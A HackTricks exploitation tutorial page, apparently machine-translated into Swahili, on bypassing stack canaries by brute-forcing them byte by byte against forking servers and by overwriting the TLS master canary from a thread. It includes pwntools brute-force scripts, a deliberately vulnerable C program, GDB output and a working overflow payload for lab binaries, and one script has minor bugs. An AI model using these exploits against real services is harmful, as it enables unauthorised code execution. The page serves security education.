# BF Forked & Threaded Stack Canaries

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Ikiwa unakabiliana na binary iliyolindwa na canary na PIE (Position Independent Executable) labda unahitaji kupata njia ya kuzipuuza.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Tambua kwamba **`checksec`** inaweza isigundue kuwa binary imekingwa na canary ikiwa ilikompiliwa kistatiki na haiwezi kutambua kazi.\
Hata hivyo, unaweza kugundua hii kwa mikono ikiwa unagundua kwamba thamani imesave kwenye stack mwanzoni mwa wito wa kazi na thamani hii inachunguzwa kabla ya kutoka.
{% endhint %}

## Kupuuza Canary kwa Nguvu ya Kuburuta

Njia bora ya kuzipuuza canary rahisi ni ikiwa binary ni programu **inayoforka michakato ya watoto kila wakati unapounda uhusiano mpya** nayo (huduma ya mtandao), kwa sababu kila wakati unapounganisha nayo **canary ile ile itatumika**.

Kwa hivyo, njia bora ya kuzipuuza canary ni kwa **kuziburuza moja kwa moja kwa herufi**, na unaweza kugundua ikiwa herufi iliyoguswa ya canary ilikuwa sahihi kwa kuchunguza ikiwa programu imeharibika au inaendelea na mtiririko wake wa kawaida. Katika mfano huu, kazi **inaburura kwa nguvu canary ya Bytes 8 (x64)** na kutofautisha kati ya herufi iliyoguswa kwa usahihi na herufi mbaya tu **kwa kuchunguza** ikiwa **jibu** limetumwa na seva (njia nyingine katika **hali nyingine** inaweza kuwa kutumia **jaribu/kinyume**):

### Mfano 1

Mfano huu umetekelezwa kwa 64bits lakini unaweza kutekelezwa kwa urahisi kwa bits 32.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Mfano 2

Hii imeboreshwa kwa bits 32, lakini inaweza kubadilishwa kwa urahisi kuwa bits 64.\
Pia eleza kwamba kwa mfano huu **programu inatarajia kwanza byte kuashiria ukubwa wa matokeo** na mzigo.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Vitambulisho

Vitambulisho vya mchakato huo huo pia **vitashiriki kitufe cha canary sawa**, hivyo itawezekana **kujaribu** canary ikiwa programu ya binary inazalisha wima mpya kila wakati shambulio linatokea.&#x20;

Kuzidi kwa ujazo wa buffer katika kazi yenye wima iliyolindwa na canary inaweza kutumika kurekebisha canary kuu ya mchakato. Kama matokeo, kinga ni bure kwa sababu ukaguzi unatumika na vitambulisho viwili ambavyo ni sawa (ingawa vimebadilishwa).

### Mfano

Programu ifuatayo inaweza kushambuliwa na Kuzidi kwa Buffer, lakini imekusanywa na canary:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Tambua kwamba `vuln` inaitwa ndani ya mchakato. Kwenye GDB tunaweza kutazama `vuln`, kwa usahihi, katika sehemu ambapo programu inaita `gets` kusoma data ya kuingiza:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Maelezo hapo juu yanawakilisha anwani ya `data`, ambapo programu itaandika matokeo ya mtumiaji. Kondoo wa stack unapatikana kwa `0x7ffff7d7ee48` (`0x493fdc653a156800`), na anwani ya kurudi iko kwa `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Tambua kuwa anwani za steki hazimiliki steki halisi:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
Mfuko wa mjadala umewekwa juu ya Uhifadhi wa Mitaa wa Mnyororo (TLS), ambapo kifaa cha kwanza cha ulinzi kimehifadhiwa:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
Baadhi ya kazi za GDB zilizotajwa hapo juu zinatokana na kifaa cha nyongeza kinachoitwa [bata24/gef](https://github.com/bata24/gef), ambacho kina vipengele zaidi kuliko [hugsy/gef](https://github.com/hugsy/gef) kawaida.
{% endhint %}

Kama matokeo, Buffer Overflow kubwa inaweza kuruhusu kuhariri both the stack canary na master canary katika TLS. Hii ni offset:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Hii ni shambulizi fupi la kuita `ushindi`:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Mifano na marejeo mengine

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* Biti 64, hakuna PIE, nx, BF canary, andika kwenye kumbukumbu fulani ROP ili kuita `execve` na ruka hapo.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* Biti 64, hakuna PIE, nx, badilisha wanyororo na canary ya bwana.
